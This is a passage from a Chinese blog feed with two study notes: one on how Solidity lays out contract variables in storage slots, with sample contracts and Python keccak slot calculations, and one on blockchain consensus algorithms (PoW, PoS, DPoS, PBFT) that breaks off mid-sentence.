    <content type="html"><![CDATA[<h1 id="合约变量存储机制"><a href="#合约变量存储机制" class="headerlink" title="合约变量存储机制"></a>合约变量存储机制</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>我们可以在智能合约上永久存储数据。每个智能合约都在自己的永久存储中维护其状态。它的作用类似于“智能合约的小型数据库”，但与其他数据库不同，该数据库是可公开访问的。存储在智能合约存储中的所有值都可供外部免费读取（通过静态调用），无需向区块链发送交易。</p><p>因为零不占用任何空间，所以可以通过将值设置为零来回收存储。当您将值更改为零时，这会在智能合约中通过gas 退款得到激励。</p><p>智能合约存储是一个key-value映射（=数据库），其中key对应存储中的一个槽号，value是这个存储槽中存储的实际值。</p><p>智能合约的存储由插槽组成，其中：</p><ul><li>每个存储槽可以包含长达 32 个字节的字。</li><li>存储槽从位置 0 开始（如数组索引）</li><li>总共有 2²⁵⁶ 存储插槽可用（用于读/写）</li></ul><p>有一个优化存储原则：如果下一个变量长度和上一个变量长度加起来不超过256bits，它们就会存储在同一个插槽里</p><p>可以使用 <code>web3.eth.getStorageAt</code> 来读取相应slot的内容</p><p>也可以在合约中编写函数来查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function readStorageSlot0() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(0)<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>也可以在区块链浏览器或remix的debug中查看</p><p><a href="https://www.freebuf.com/articles/blockchain-articles/175237.html">参考1</a></p><p><a href="https://docs.soliditylang.org/en/v0.4.20/miscellaneous.html#layout-of-state-variables-in-storage">参考2-Storage官方文档</a></p><h2 id="固定大小的值"><a href="#固定大小的值" class="headerlink" title="固定大小的值"></a>固定大小的值</h2><h3 id="简单变量"><a href="#简单变量" class="headerlink" title="简单变量"></a>简单变量</h3><p>即值类型</p><ul><li><code>bool</code>：可以保存 true 或 false 作为其值的布尔值</li><li><code>uint</code>：这是无符号整数，只能保存0和正值</li><li><code>int</code>：这是可以保存负值和正值的有符号整数</li><li><code>address</code>：这表示以太坊环境中的账户地址</li><li><code>byte</code>：这表示固定大小的字节数组（<code>byte1</code> 到 <code>bytes32</code>）</li></ul><p><a href="https://jeancvllr.medium.com/solidity-tutorial-all-about-bytes-9d88fdb22676">一些关于byte的知识</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.6.0;<br>contract StorageContract &#123;<br>    uint256 a = 10;<br>    uint64 b = 20;<br>    uint8 c = 30;<br>    int128 d = 40;<br>    bool e = false;<br>    bytes1 f = 0x10;<br>    address g = 0x80ec8696D724686adCC88fFF14Bde24A4d0e38De;<br>    function readStorageSlot0() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(0)<br>        &#125;<br>    &#125;<br>    function readStorageSlot1() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(1)<br>        &#125;<br>    &#125;<br>    function readStorageSlot2() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(2)<br>        &#125;<br>    &#125;<br>    function readStorageSlot3() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(3)<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/image-20220807185513619.png" alt="image-20220807185513619"></p><p>分析一下</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-comment">//slot0</span><br><span class="hljs-number">0x000000000000000000000000000000000000000000000000000000000000000a</span><br><span class="hljs-built_in">uint</span>256 a=<span class="hljs-number">10</span><br><br><span class="hljs-comment">//slot1</span><br><span class="hljs-number">0x00000000001000000000000000000000000000000000281e0000000000000014</span><br><span class="hljs-number">0x0000000000000014</span> <span class="hljs-built_in">uint</span>64 b=<span class="hljs-number">20</span><br><span class="hljs-number">0x1e</span> <span class="hljs-built_in">uint</span>8 c=<span class="hljs-number">30</span><br><span class="hljs-number">0x00000000000000000000000000000028</span> <span class="hljs-built_in">uint</span>128 d=<span class="hljs-number">40</span><br><span class="hljs-number">0x00</span> <span class="hljs-built_in">bool</span> e=<span class="hljs-literal">false</span><br><span class="hljs-number">0x10</span> bytes1 f=<span class="hljs-number">0x10</span><br><br><span class="hljs-comment">//slot2</span><br><span class="hljs-number">0x00000000000000000000000080ec8696d724686adcc88fff14bde24a4d0e38de</span><br>address g<br></code></pre></td></tr></table></figure><h3 id="定长数组"><a href="#定长数组" class="headerlink" title="定长数组"></a>定长数组</h3><p>定长数组即事先规定好长度的数组，和简单变量类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract arrayContract &#123;<br>    bytes8[5] a = [byte(0x6a),0x68,0x79,0x75];<br>    function readStorageSlot0() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(0)<br>        &#125;<br>    &#125;<br>    /*<br>    function add() public&#123;<br>        a.push(0x99);<br>    &#125;<br>    */<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/image-20220808215319958.png" alt="image-20220808215319958"></p><p>在storage中存储后，后续想要在数组中添加是不被允许的</p><p><img src="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/image-20220808215215380.png" alt="image-20220808215215380"></p><h3 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h3><p>结构体Struct也是类似</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract arrayContract &#123;<br>    struct Entry &#123;<br>        byte id;<br>        byte value;<br>    &#125;<br>    <br>    bytes4[5] a = [byte(0x6a),0x68,0x79,0x99];<br>    bool b = true;<br>    Entry c = Entry(&#123;id:0x25,value:0x98&#125;);<br>    <br>    function Slot0() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(0)<br>        &#125;<br>    &#125;<br>    function Slot1() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(1)<br>        &#125;<br>    &#125;<br>    function Slot2() public view returns (bytes32 result) &#123;<br>        assembly &#123;<br>            result := sload(2)<br>        &#125;<br>    &#125;<br>    /*<br>    function add() public&#123;<br>        a.push(0x99);<br>    &#125;<br>    */<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/image-20220808225505324.png" alt="image-20220808225505324"></p><h2 id="动态大小的值"><a href="#动态大小的值" class="headerlink" title="动态大小的值"></a>动态大小的值</h2><p>Solidity 使用散列函数来统一且可重复地计算动态大小值的位置。</p><h3 id="动态数组"><a href="#动态数组" class="headerlink" title="动态数组"></a>动态数组</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract TEST&#123;<br>    uint[] a=[0x77,0x88,0x99];<br>    function add() public&#123;<br>        a.push(0x66);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/image-20220808230350960.png" alt="image-20220808230350960"></p><p>如何计算数据存储的第一个slot，把储存数组长度的位置进行keccak_256</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">from</span> _pysha3 <span class="hljs-keyword">import</span> keccak_256<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">byte32</span>(<span class="hljs-params">i</span>):</span><br>    <span class="hljs-keyword">return</span> binascii.unhexlify(<span class="hljs-string">&#x27;%064x&#x27;</span>%i)<br><br>//用数组长度存储的位置进行计算<br>a=keccak_256(byte32(<span class="hljs-number">0</span>)).hexdigest()<br><span class="hljs-built_in">print</span>(a)<br><br><span class="hljs-comment">#290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563</span><br></code></pre></td></tr></table></figure><p>后面的数据存储的slot依次+1</p><h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">contract <span class="hljs-keyword">MAPPING</span> &#123;<br>    <span class="hljs-keyword">mapping</span>(uint256 =&gt; uint256) a;<br>    <span class="hljs-keyword">function</span> <span class="hljs-keyword">add</span>() <span class="hljs-built_in">public</span> &#123;<br>        a[<span class="hljs-number">123</span>] = <span class="hljs-number">456</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/08/09/%E5%90%88%E7%BA%A6%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E6%9C%BA%E5%88%B6/image-20220808233453422.png" alt="image-20220808233453422"></p><p>将mapping的key和slot一起keccak_256</p><p>注意，mapping的位置实际上没有存储任何内容。（没有要存储的长度，单个值需要位于其他位置。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">from</span> _pysha3 <span class="hljs-keyword">import</span> keccak_256<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">byte32</span>(<span class="hljs-params">i</span>):</span><br>    <span class="hljs-keyword">return</span> binascii.unhexlify(<span class="hljs-string">&#x27;%064x&#x27;</span>%i)<br><br><br>b=keccak_256(byte32(<span class="hljs-number">123</span>)+byte32(<span class="hljs-number">0</span>)).hexdigest()<br><span class="hljs-built_in">print</span>(b)<br><br><span class="hljs-comment">#de31a920dbdd1f015b2a842f0275dc8dec6a82ff94d9b796a36f23c64a3c8332</span><br></code></pre></td></tr></table></figure><h2 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h2><p><a href="https://sissice.github.io/2022/02/27/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8A%EF%BC%89/">Ethernaut闯关 12.Privacy</a></p><p><a href="https://sissice.github.io/2022/03/13/Ethernaut%E9%97%AF%E5%85%B3%EF%BC%88%E4%B8%8B%EF%BC%89/">Ethernaut闯关 19.Alien Codex</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>共识算法学习记录</title>
    <link href="/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="共识算法学习记录"><a href="#共识算法学习记录" class="headerlink" title="共识算法学习记录"></a>共识算法学习记录</h1><p>包括POW,POS,DPOS,PBFT,RAFT</p><h2 id="学习资料"><a href="#学习资料" class="headerlink" title="学习资料"></a>学习资料</h2><p><a href="https://www.cnblogs.com/ACaiGarden/p/15087042.html">区块链共识算法综述</a></p><h2 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a>拜占庭将军问题</h2><p>「拜占庭将军问题」来源于这样一个场景：拜占庭帝国的军队正在围攻一座城市。这支军队被分成了多支小分队，驻扎在城市周围的不同方位，每支小分队由一个将军领导。这些将军们彼此之间只能依靠信使传递消息（无法聚在一起开个会）。每个将军在观察自己方位的敌情以后，会给出一个各自的行动建议（比如进攻、撤退或按兵不动），但最终的需要将军们达成一致的作战计划并共同执行，否则就会被敌人各个击破。但是，这些将军中可能有叛徒，他们会尝试阻止其他忠诚的将军达成一致的作战计划。</p><p>这就是拜占庭将军的「问题」：只能依靠通信相互交流，又不知道谁是叛徒，怎么能不受叛徒们的影响，让这些忠诚的将军快速的达到一致的作战计划呢？</p><p>很显然，将这一场景套用到计算机系统中也是非常适用的：在一个分布式系统中，针对每个运算，每台独立的机器也需要最终达成一致的结果。但每台计算机之间也只能依靠网络通信（显然它们无法聚在一起开会），每台计算机都有出错的可能（被攻击，或故障），从而变成「叛徒」干扰正常的计算机达成一致。</p><p>这一问题是由 Leslie·Lamport 等人在<a href="https://www-inst.eecs.berkeley.edu/~cs162/sp16/static/readings/Original_Byzantine.pdf">这篇论文</a>中提出的，并在论文中给出了理论可行的解决方案和证明。事实上, 拜占庭将军问题是分布式系统领域最复杂的<strong>容错模型</strong>, 它描述了如何在存在恶意行为(如消息篡改或伪造)的情况下使分布式系统达成一致。 是我们理解分布式一致性协议和算法的重要基础。</p><p>论文中给出了一个结论: 如果存在<em>m</em>个叛将, 那么至少需要<em>3m+1</em>个将军, 才能最终达到一致的行动方案。</p><p>Leslie Lamport在论文中给出了两种拜占庭将军问题的解决方案, 即口信消息型解决方案(A solution with oral message)和签名消息型解决方案(A solution with signed message).</p><h3 id="口信消息型解决方案"><a href="#口信消息型解决方案" class="headerlink" title="口信消息型解决方案"></a>口信消息型解决方案</h3><p>首先, 所谓口头消息，是指内容完全由发送者或转发者控制的消息。需要对消息传递系统作如下的限制：</p><ul><li>A1. 任何已经发送的消息都将被正确传达</li><li>A2. 消息的接收者知道是谁发送了消息</li><li>A3. 消息的缺席可以被检测</li></ul><p>A1 和 A2 可以防止叛徒干扰两个将军之间的通信：A1 让叛徒无法在通信过程中修改信息；A2 让叛徒无法冒充其它将军发送消息。A3 可以防止叛徒通过不发消息的方式影响一致共识的达成。并且如果将军们发现缺少某个消息，他们可以使用统一的默认值（比如RETREAT）来替代缺失的消息。</p><h3 id="签名消息型解决方案"><a href="#签名消息型解决方案" class="headerlink" title="签名消息型解决方案"></a>签名消息型解决方案</h3><p>口头消息的解决方案之所以复杂，就是因为叛徒可以随意改更忠诚将军的消息，而别人无法发现消息被改。如果我们让忠诚将军的消息无法篡改，那么问题就变得简单多了。这就是签名消息的解决方案。所以, 签名消息的限制是在口信消息定义的基础上增加了如下两条:</p><ul><li>A4. 忠诚将军的签名无法伪造，而且对他签名消息的内容进行任何更改都会被发现</li><li>A5. 任何人都能验证将军签名的真伪</li></ul><p>这里<strong>通过消息不可篡改这一特性，让所有忠诚将军成为「一体」，就像同一个人一样。</strong></p><p>签名消息型解决方案可以处理任何数量叛将的场景.</p><h2 id="POW"><a href="#POW" class="headerlink" title="POW"></a>POW</h2><p><strong>干的越多，获得越多。</strong></p><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>工作量证明（PoW，Proof of Work）</p><p>代表项目：BTC</p><p>PoW是是首个共识算法。它是由中本聪在他的论文中提出的，用于建立分布式无信任共识并识别“双重支付”（double spend）问题。PoW并非一个新理念，但是中本聪将Pow与加密签名、Merkle链和P2P网络等已有理念结合，形成一种可用的分布式共识系统。</p><p>由于不同的节点接受数据有所区别，为了保证数据一致性，每个区块数据只能由一个节点进行记录。BTC通过POW来确认记账节点。每个节点如果想生成一个新的区块并写入区块链，必须解出比特币网络出的PoW问题。其关键的要素是工作量证明函数、区块信息及难度值。工作量证明函数是这道题的计算方式，区块决定了这道题的输入数据，难度值决定了这道题所需要的计算量。可以简单理解成就是将不同的nonce值作为输入，尝试进行SHA256哈希运算，找出满足给定数量前导0的哈希值的过程。而要求的前导0的个数越多，代表难度越大。</p><blockquote><p>新难度值=旧难度值×（过去2016个区块花费时长/20160分钟）</p><p>目标值=最大目标值/难度值</p><p>其中最大目标值为一个恒定值，难度为1时的目标值，即2^224：0x00000000FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF</p><p>比特币工作量证明的达成就是矿工计算出来的区块哈希值必须小于目标值</p></blockquote><p>比特币节点求解工作量证明问题的步骤大致归纳如下：</p><ol><li>生成铸币交易，并与其他所有准备打包进区块的交易组成交易列表，通过Merkle树算法生成Merkle根哈希；</li><li>把Merkle根哈希及其他相关字段组装成区块头，将区块头的80字节数据作为工作量证明的输入；</li><li>不停地变更区块头中的随机数，即nonce的数值，并对每次变更后的区块头做双重SHA256运算（即SHA256（SHA256（Block_Header））），将结果值与当前网络的目标值做对比，如果小于目标值，则解题成功，工作量证明完成。</li></ol><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点：</strong></p><p>1）去中心化，将记账权公平的分派到其他节点。你能够获得的币的数量，取决于你挖矿贡献的有效工作，也就是说，你用于挖矿的矿机的性能越好，分给你的收益就会越多，这就是根据你的工作证明来执行币的分配方式。</p><p>2）安全性高，破坏系统需要投入极大的成本，如果想作弊，要有压倒大多数人的算力（51%攻击）。因为作弊要付出一定成本，作弊者就会谨慎对待了。在比特币的 PoW 机制中，由于获得计算结果的概率趋近于所占算力比例，因此在不掌握51%以上算力的前提下，矿工欺诈的成本要显著高于诚实挖矿，甚至不可能完成欺诈(由于概率过低)。</p><p><strong>缺点：</strong></p><p>1）挖矿造成大量的资源浪费，目前bitcoin已经吸引全球大部分的算力，其它再用Pow共识机制的区块链应用很难获得相同的算力来保障自身的安全。这让依据算力公平分配奖励的机制，演变为了对矿机算力的大举投入，扭曲了中本聪的设计初衷。</p><p>2）网络性能太低，需要等待多个确认，容易产生分叉，区块的确认共识达成的周期较长（10分钟），现在每秒交易量上限是7笔（visa的平均每秒交易量上万，支付宝峰值接近9万），不适合商业应用。</p><p>3）PoW共识算法算力集中化，慢慢的偏离了原来的去中心化轨道。从比特币扩容之争可以看到，算力高的大型矿池是主人，而持币的人没有参与决定的权利，比特币分叉出很多儿子，即将失去“去中心化”的标签。</p><h2 id="POS"><a href="#POS" class="headerlink" title="POS"></a>POS</h2><p><strong>持有越多，获得越多。</strong></p><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>权益证明（PoS，Proof of Stake）</p><p>以太坊正在由POW转为POS</p><p>PoS 试图解决 PoW 机制中大量资源被浪费的情况。</p><p>在 POW 工作量证明中，主要是根据算力来决定哪个节点可以进行生产新区块，算力越大有越大的概率获得打包新区块的机会; 而在 POS 权益证明中主要就是根据股权，拥有的股权高即有越高的概率获得生产新区块的机会。</p><p>在 POS 权益证明共识机制里有个专有名次叫做币龄。在 POS 权益证明共识系统中的每个货币每天都会产生 1 币龄，若你在权益证明机制中拥有 100 枚货币并存放了 10 天，你的币龄就为 1,000。若你成功被系统挑选出挖掘新区块，你的币龄会归 0 并重新开始累积计算，你会获得的奖励公式如下：</p><blockquote><p>奖励 = 币龄 * 年利率 / 365</p></blockquote><p>意味你每被清空 365 币龄即会从区块中会得 N% 年利率的货币奖励。假使在一个当前年利率为 5% 的系统中，你每成功帮忙打包一个新区块会获得的奖励为 1,000 * 5% / 365 = 0.137 个系统货币。</p><h3 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点：</strong></p><p>1）在一定程度上缩短了共识达成的时间。</p><p>2）不再需要大量消耗能源挖矿。</p><p>3）Pos 当然也能防作弊，因为如果一名持有 51%以上股权的人作弊，相当于他坑了自己，因为一个人自己不会杀死自己的钱。</p><p><strong>缺点：</strong></p><p>1）还是需要挖矿，本质上没有解决商业应用的痛点；</p><p>2）POS面临的最严重的一个问题就是无成本利益问题，在PoS系统中做任何事几乎没有成本，比如在PoS系统上挖矿几乎没有成本，这也就意味着分叉非常方便。</p><p>3）极端的情况下会带来中心化的结果。PoS 机制由股东自己保证安全，工作原理是利益捆绑。在这个模式下，不持有 PoS 的人无法对 PoS 构成威胁。PoS 的安全取决于持有者，和其他任何因素无关。在POS机制里，拥有币和币龄越高的节点拥有着越高产生新区块的权力。简单来说，就是你拥有越多的币，并且你拥有的币的币龄越久，就有可能获得记账权的概率越大。POS虽然解决了POW的能耗的问题，但全节点确认会让区块确认的效率提不起来，且时间越长，也越容易产生马太效应，即持有币越多的人会获得更多的币奖励，从而加大贫富差距，最终产生超过50%的中心化节点，被动演化为非预期的中心化的结果。</p><p>4）币龄其实就是时间，一旦挖矿者囤积一定的币，很久很久之后发起攻击，这样将很容易拿到记账权。并且，矿工可以囤积代币从而导致货币流通困难。</p><h2 id="DPOS"><a href="#DPOS" class="headerlink" title="DPOS"></a>DPOS</h2><p><strong>带中心化思路的共识机制</strong></p><p><strong>人民代表大会制度</strong></p><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>委任权益证明（DPOS，Delegated Proof-of-Stake）</p><p>DPoS算法是根据当时PoW、PoS的不足而改进的共识算法，它的目的就是为了提高性能，也就是交易确认时间短。</p><p>跟PoS不同的是，持有少数股份（权益）的节点也能行使他们的共识权了，只不过是以一种间接的方式。类似于股东代表大会，每当要决策公司大事（记什么账，谁来记账）的时候，全体股民（节点）依法行使投票权，选出自己心中的股东代表（可信账户），谁得票高谁当选。候选人可以去公开演讲拉票，获得足够多股民（节点）的信任，然后股东代表（被选中的可信节点）代表股民决策公司大事，股东代表的人数由系统决定，比如Bitshares为101个、Asch为51个，EOS为21个。</p><p>比特股（Bitshare）是一类采用DPoS机制的密码货币，它期望通过引入一个技术民主层来减少中心化的负面影响。</p><p>它的原理是让每一个持有比特股的人进行投票，由此产生101位代表 , 我们可以将其理解为101个超级节点或者矿池，而这101个超级节点彼此的权利是完全相等的。从某种角度来看，DPOS有点像是议会制度或人民代表大会制度。如果代表不能履行他们的职责（当轮到他们时，没能生成区块），他们会被除名，网络会选出新的超级节点来取代他们。</p><p>比特股引入了见证人这个概念，见证人可以生成区块，每一个持有比特股的人都可以投票选举见证人。见证人会因为生成区块而获得一笔支付费用。该费用是由权益持有者设立的 。得到总同意票数中的前N个（N通常定义为101）候选者可以当选为见证人，<strong>当选见证人的个数（N）需满足：至少一半的参与投票者相信N已经充分地去中心化。</strong>见证人的候选名单每个维护周期（1天）更新一次。见证人然后随机排列，每个见证人按序有2秒的权限时间生成区块，若见证人在给定的时间片不能生成区块，区块生成权限交给下一个时间片对应的见证人。DPoS的这种设计使得区块的生成更为快速，也更加节能。</p><p>DPoS充分利用了持股人的投票，以公平民主的方式达成共识，他们投票选出的N个见证人，可以视为N个矿池，而<strong>这N个矿池彼此的权利是完全相等的</strong>。持股人可以随时通过投票更换这些见证人（矿池），只要他们提供的算力不稳定，计算机宕机，或者试图利用手中的权力作恶。</p><p>在 DPoS 中，矿工可以合作生成块，而不是像在 PoW 和 PoS 中那样竞争生成。通过区块生成的部分中心化，DPoS 的运行可以比其它共识算法呈数量级快。</p><p>注意</p><p>1）DPoS机制中的股民（节点）根据自己持有的加密货币数量占总量的百分比（占股比例）来投票，不是一人一票； </p><p>2）选举出的股东代表（可信节点）完全对等，可理解为具有同等算力的101个矿池； </p><p>3）股东代表一旦无能、不作为、胡作为（提供的算力不稳定，计算机宕机、或者试图利用手中的权力作恶），将立刻被股民踢出整个系统，然后由其他后备代表顶上去； </p><p>4）决策完公司大事（记完账、出完块）有钱分，根据占股比例。</p><h3 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h3><p><strong>优点：</strong> </p><p>节能、快速、高流量博客网站Steemit就使用了它。EOS 的块时间是 0.5 秒。 </p><p>1）记账节点减少，交易速度更快，EOS号称可达百万TPS； </p><p>2）更加安全，一般不不会发生链分叉并不可逆，确保最终一致性； </p><p>3）相对PoW，解决了资源消耗问题；</p><p><strong>缺点：</strong></p><p>1）略为中心化、拥有高权益的参与者可投票使自己成为一名验证者。DPoS机制的设计并不能保证一定有足额的真实的区块生产者，因为一个人或一个实体，可能控制着多个节点。这是近期已在 EOS 中出现的问题。</p><p>2）对于坏节点的处理存在诸多困难。社区选举不能及时有效的阻止一些破坏节点的出现，给网络造成安全隐患，同时在网络节点数量少的场景，选举的BP代表性不强。</p><h2 id="PBFT"><a href="#PBFT" class="headerlink" title="PBFT"></a>PBFT</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>PBFT是Practical Byzantine Fault Tolerance的缩写，意为实用拜占庭容错算法。该算法是Miguel Castro和Barbara Liskov在1999年提出来的，解决了原始拜占庭容错算法效率不高的问题，将算法复杂度由指数级降低到多项式级，使得拜占庭容错算法在实际系统应用中变得可行。</p><p>PBFT算法的核心理论是N&gt;=3F+1，其中N是总节点数，F是故障节点（故障包括叛徒或不响应）。假如有F个故障节点，至少有3F+1个节点才能保证整个系统正确运行。</p><p><a href="https://link.zhihu.com/?target=http://pmg.csail.mit.edu/papers/osdi99.pdf">Practical Byzantine Fault Tolerance（原论文）</a></p><p><a href="https://zhuanlan.zhihu.com/p/35847127">参考</a></p><p>算法流程：</p><p> PBFT基于拜占庭将军问题，一致性的确保主要分为这三个阶段：预准备（pre-prepare）、准备(prepare)和确认(commit)</p><p><img src="/2022/08/06/%E5%85%B1%E8%AF%86%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20220806160119663.png" alt="image-20220806160119663"></p><p> 其中C为发送请求端，0123为服务端，3为宕机的服务端（即作恶节点），具体步骤如下：</p><p><strong>1.Request：</strong>请求端C发送请求到任意一节点，这里是0 </p><p><strong>2.Pre-Prepare：</strong>服务端0收到C的请求后进行广播，扩散至123 </p><p><strong>3.Prepare：</strong>123,收到后记录并再次广播，1-&gt;023，2-&gt;013，3因为宕机无法广播 。在一定时间范围内，如果收到超过 2f +1个不同节点（包括自己）的 prepare 消息，就代表 prepare 阶段已经完成。</p><p><strong>4.Commit：</strong>0123节点在Prepare阶段，若收到超过一定数量的相同请求，则进入Commit阶段，广播Commit请求； 当收到 2f+1 个 commit 消息后（包括自己），代表大多数节点已经进入 commit 阶段，这一阶段已经达成共识，于是节点就会执行请求，写入数据。</p><p><strong>5.Reply：</strong>0123节点在Commit阶段，若收到超过一定数量的相同请求，则对C进行反馈；c收到来自 f+1 